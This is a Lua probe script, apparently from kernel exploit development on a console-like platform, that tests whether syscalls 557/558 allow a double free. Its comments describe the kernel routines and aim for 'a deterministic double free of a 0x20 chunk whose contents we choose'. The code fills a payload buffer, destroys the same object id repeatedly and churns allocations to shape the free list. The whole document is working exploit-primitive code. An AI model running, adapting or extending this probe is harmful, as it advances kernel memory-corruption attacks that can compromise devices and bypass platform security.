-- CRASH_CLASS: HIGH
-- PROBE 782a: 557 creates, 558 destroys - is the destroy idempotent?
--
-- 13.60 body: 557 mallocs 0x20, copyin 0x20 bytes from uap[0], wraps it in a
-- 0x18 entry {[0]=payload,[8]=uap[1]}, registers it under an id from the same
-- allocator aio uses (0x3998e0), stores the id at td+0x408 and returns 0.
-- 558 looks the id up, removes the entry, frees [entry], frees the entry.
-- If the second 558 on the same id still frees, that is a deterministic
-- double free of a 0x20 chunk whose contents we choose.
print("=== PROBE 782a: SYS 557/558 PAIR ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a)
    a=to_num(a)
    if a<0 then a=a+18446744073709551616 end
    return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296))
end
local function call(sc,a1,a2,a3,a4,a5,a6)
    local ok,r=pcall(function() return sc(U(a1),U(a2),U(a3),U(a4),U(a5),U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-8,8 do memory.write_qword(a+i,0) end end) end
local function alive() return tostring(call(mk(20),0,0,0,0,0,0)) end
local page=to_num(memory.alloc(0x2000)); zero(page,0x2000)
-- fill the payload with a readable pattern
for i=0,7 do wd(page+i*4, 0x41414141+i) end
local function make557(tag)
    local r=call(mk(557),page,0x1000,0,0,0,0)
    print(string.format("[A] 557(%s)=%s",tag,tostring(r)))
    return r
end
local ids={}
for i=1,3 do ids[i]=make557("obj"..i) end
print("[B] alive="..alive())
-- destroy the middle one twice
local function d558(id) if type(id)~="number" or id<=0 then return "skip" end return call(mk(558),id,0,0,0,0,0) end
local first=d558(ids[2])
print(string.format("[C] 558(id2) first=%s alive=%s",tostring(first),alive()))
local second=d558(ids[2])
print(string.format("[C] 558(id2) second=%s alive=%s",tostring(second),alive()))
local third=d558(ids[2])
print(string.format("[C] 558(id2) third=%s alive=%s",tostring(third),alive()))
-- destroy the others once, in order, then re-create to see the free list
for _,id in ipairs({ids[1],ids[3]}) do
    print(string.format("[D] 558(%s)=%s alive=%s",tostring(id),tostring(d558(id)),alive()))
end
-- [E] destroy the id that was never created
print(string.format("[E] 558(99999)=%s alive=%s",tostring(call(mk(558),99999,0,0,0,0,0)),alive()))
-- [F] create/destroy churn with payload reuse
local caught=0
for i=1,64 do
    local id=call(mk(557),page,0x1000,0,0,0,0)
    if type(id)=="number" and id>0 then
        local d=d558(id)
        if d==0 then caught=caught+1 end
    end
end
print(string.format("[F] churn created+destroyed=%d alive=%s",caught,alive()))
print("=== 782a DONE ===")
